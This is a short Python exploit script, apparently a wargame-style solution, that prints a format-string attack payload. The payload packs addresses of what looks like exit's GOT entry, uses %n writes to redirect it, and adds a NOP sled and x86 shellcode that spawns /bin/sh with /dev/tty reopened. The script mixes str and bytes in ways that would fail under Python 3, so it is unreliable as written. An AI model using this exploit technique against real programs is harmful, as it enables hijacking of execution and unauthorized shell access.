import struct

shellcode = b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

nop = b"\x90"*64

exit_b1 = struct.pack('I', 0x8049838) + b"AAAA"
exit_b2 = struct.pack('I', 0x8049839) + b"AAAA"
exit_b3 = struct.pack('I', 0x804983a) + b"AAAA"
exit_b4 = struct.pack('I', 0x804983b)

sh_b1 = 0x80 - 0x28
sh_b2 = 0xf5 - sh_b1
sh_b3 = 0xff - sh_b2
sh_b4 = 0xbf - sh_b3

f = "%x%x"
f += b'%0' + str(sh_b1) + b"x%n" 
f += b'%0' + str(sh_b2) + b"x%n"
f += b'%0' + str(sh_b3) + b"x%n"
f += b'%0' + str(sh_b4) + b"x%n"

print(exit_b1 + exit_b2 + exit_b3 + exit_b4 + f + nop + shellcode)
